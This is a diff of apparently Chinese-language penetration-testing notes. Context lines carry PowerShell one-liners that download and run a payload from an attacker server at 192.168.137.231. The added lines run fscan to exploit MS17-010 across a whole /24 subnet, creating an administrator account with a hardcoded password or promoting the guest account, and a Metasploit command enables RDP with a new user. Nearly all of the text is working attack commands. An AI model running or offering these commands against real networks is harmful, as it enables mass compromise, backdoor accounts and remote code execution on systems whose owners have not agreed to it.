@@ -32,9 +32,15 @@ powershell_execute "IEX ((new-object net.webclient).downloadstring('http://TeamS
 IEX ((new-object net.webclient).downloadstring('http://192.168.137.231:33211/bugs'))
 ```
 
-### 开启3389
+### 添加账号开启3389
 
 ```bash
+# fscan，添加一个账号  sysadmin  密码1qaz@WSX!@#4  只支持x64
+fscan.exe -h 192.168.1.0/24 -m ms17010 -sc add
+# 启用guest账号，并添加为管理员
+fscan.exe -h 192.168.1.0/24 -m ms17010 -sc guest
+
+
 # 开启3389并且添加用户
 run post/windows/manage/enable_rdp username="synb123" password="qqNBNo.1"
 
